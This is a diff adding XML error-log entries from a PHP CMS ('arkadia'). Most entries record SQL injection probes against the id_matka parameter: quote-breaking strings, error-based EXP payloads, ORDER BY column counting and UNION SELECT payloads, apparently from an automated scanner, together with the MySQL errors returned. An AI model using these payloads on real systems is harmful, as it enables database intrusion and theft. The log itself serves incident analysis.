@@ -1,0 +1,184 @@
+<errorentry>
+	<datetime>2021-05-18 09:23:56</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='19.,.)')'"'(' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')'"'(' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:23:56</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='19'vezVxk<'">yySstv' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'vezVxk<'">yySstv' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:24:03</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='19') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171706271,(SELECT (ELT(1105=1105,1))),0x71627a7171,0x78))x)) AND ('avOK'='avOK' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171706271,(SELECT (ELT(1105=1105,1))' at line 1 ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:24:04</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='19' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171706271,(SELECT (ELT(1105=1105,1))),0x71627a7171,0x78))x)) AND 'oVOd'='oVOd' AND status=1 ORDER BY id, ## DOUBLE value is out of range in 'exp(~((select `x`.`CONCAT(0x7171706271,(SELECT (ELT(1105=1105,1))),0x71627a7171,0x78)` from (select concat(0x7171706271,elt((1105 = 1105),1),0x71627a7171,0x78) AS `CONCAT(0x7171706271,(SELECT (ELT(1105=1105,1))),0x71627a7171,0x78)`) `x`)))' ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:24:04</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='19') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171706271,(SELECT (ELT(1105=1105,1))),0x71627a7171,0x78))x)) AND ('bLOH' LIKE 'bLOH' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171706271,(SELECT (ELT(1105=1105,1))' at line 1 ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:24:04</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='19' AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7171706271,(SELECT (ELT(1105=1105,1))),0x71627a7171,0x78))x)) AND 'tLaH' LIKE 'tLaH' AND status=1 ORDER BY id, ## DOUBLE value is out of range in 'exp(~((select `x`.`CONCAT(0x7171706271,(SELECT (ELT(1105=1105,1))),0x71627a7171,0x78)` from (select concat(0x7171706271,elt((1105 = 1105),1),0x71627a7171,0x78) AS `CONCAT(0x7171706271,(SELECT (ELT(1105=1105,1))),0x71627a7171,0x78)`) `x`)))' ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:24:07</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='19') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171706271,(SELECT (ELT(1538=1538,1))),0x71627a7171,0x78))x)) AND ('Rpbz'='Rpbz' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171706271,(SELECT (ELT(1538=1538,1)))' at line 1 ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:24:07</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='19' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171706271,(SELECT (ELT(1538=1538,1))),0x71627a7171,0x78))x)) AND 'VIgE'='VIgE' AND status=1 ORDER BY id, ## DOUBLE value is out of range in 'exp(~((select `x`.`CONCAT(0x7171706271,(SELECT (ELT(1538=1538,1))),0x71627a7171,0x78)` from (select concat(0x7171706271,elt((1538 = 1538),1),0x71627a7171,0x78) AS `CONCAT(0x7171706271,(SELECT (ELT(1538=1538,1))),0x71627a7171,0x78)`) `x`)))' ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:24:07</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='19') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171706271,(SELECT (ELT(1538=1538,1))),0x71627a7171,0x78))x)) AND ('BEgz' LIKE 'BEgz' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171706271,(SELECT (ELT(1538=1538,1)))' at line 1 ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:24:07</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='19' OR EXP(~(SELECT * FROM (SELECT CONCAT(0x7171706271,(SELECT (ELT(1538=1538,1))),0x71627a7171,0x78))x)) AND 'TUWA' LIKE 'TUWA' AND status=1 ORDER BY id, ## DOUBLE value is out of range in 'exp(~((select `x`.`CONCAT(0x7171706271,(SELECT (ELT(1538=1538,1))),0x71627a7171,0x78)` from (select concat(0x7171706271,elt((1538 = 1538),1),0x71627a7171,0x78) AS `CONCAT(0x7171706271,(SELECT (ELT(1538=1538,1))),0x71627a7171,0x78)`) `x`)))' ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:24:39</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='19') ORDER BY 1-- AwQK' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') ORDER BY 1-- AwQK' AND status=1 ORDER BY id' at line 1 ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:24:40</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='19' ORDER BY 6789-- rFAi' AND status=1 ORDER BY id, ## Unknown column '6789' in 'order clause' ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:24:40</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='19' ORDER BY 40-- RiSJ' AND status=1 ORDER BY id, ## Unknown column '40' in 'order clause' ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:29:21</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='19')) AS OpVu WHERE 3862=3862 UNION ALL SELECT CONCAT(0x7171706271,0x52726944437762716c4942777158695345756c6b497a6f487343445a4e6e507a7154707678456244,0x71627a7171),32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AS OpVu WHERE 3862=3862 UNION ALL SELECT CONCAT(0x7171706271,0x52726944437762' at line 1 ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:29:23</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='19')) AS ruPf WHERE 2799=2799 UNION ALL SELECT CONCAT(0x7171706271,0x4f6e43545a7455476e6f,0x71627a7171),32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AS ruPf WHERE 2799=2799 UNION ALL SELECT CONCAT(0x7171706271,0x4f6e43545a7455' at line 1 ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:29:24</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='-2867')) AS bFQT WHERE 6804=6804 UNION ALL SELECT CONCAT(0x7171706271,0x717a67687a44556b714471714e7a6673724b4b524b4d64756a416b617549434649584c7757717443,0x71627a7171),32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AS bFQT WHERE 6804=6804 UNION ALL SELECT CONCAT(0x7171706271,0x717a67687a4455' at line 1 ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:29:25</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='-5854')) AS QdHg WHERE 8727=8727 UNION ALL SELECT CONCAT(0x7171706271,0x6b545272626457655062,0x71627a7171),32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ')) AS QdHg WHERE 8727=8727 UNION ALL SELECT CONCAT(0x7171706271,0x6b545272626457' at line 1 ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:29:35</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='19') AS lZiE WHERE 6822=6822 UNION ALL SELECT CONCAT(0x7171706271,0x437a4b6577506852465569515145496f4d4552636f48544a4e5246536c416961636d61506c6b4950,0x71627a7171),32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS lZiE WHERE 6822=6822 UNION ALL SELECT CONCAT(0x7171706271,0x437a4b657750685' at line 1 ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:29:37</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='19') AS sgwl WHERE 6475=6475 UNION ALL SELECT CONCAT(0x7171706271,0x4b474b554e4366444142,0x71627a7171),32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS sgwl WHERE 6475=6475 UNION ALL SELECT CONCAT(0x7171706271,0x4b474b554e43664' at line 1 ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:29:38</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='-1950') AS ddWU WHERE 7011=7011 UNION ALL SELECT CONCAT(0x7171706271,0x57597852467a6472706e63445a5a6a70794964527863646a544f5341425676427443416b6b475662,0x71627a7171),32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS ddWU WHERE 7011=7011 UNION ALL SELECT CONCAT(0x7171706271,0x57597852467a647' at line 1 ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 09:29:40</datetime>
+	<errornum>E_USER_ERROR</errornum>
+	<errormsg>SELECT * FROM arkadia_art_akapity WHERE id_matka='-7081') AS ZIwq WHERE 5170=5170 UNION ALL SELECT CONCAT(0x7171706271,0x4f476c7147706a724b67,0x71627a7171),32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32,32#' AND status=1 ORDER BY id, ## You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') AS ZIwq WHERE 5170=5170 UNION ALL SELECT CONCAT(0x7171706271,0x4f476c7147706a7' at line 1 ## </errormsg>
+	<scriptname>/arkadia/klasy/class.bazasql.php</scriptname>
+	<scriptlinenum>390</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 16:09:51</datetime>
+	<errornum>E_NOTICE</errornum>
+	<errormsg>Undefined offset: 10</errormsg>
+	<scriptname>/arkadia/mod/art/class.art.php</scriptname>
+	<scriptlinenum>2230</scriptlinenum>
+</errorentry>
+
+<errorentry>
+	<datetime>2021-05-18 17:50:20</datetime>
+	<errornum>E_NOTICE</errornum>
+	<errormsg>Undefined offset: 10</errormsg>
+	<scriptname>/arkadia/mod/art/class.art.php</scriptname>
+	<scriptlinenum>2230</scriptlinenum>
+</errorentry>
+
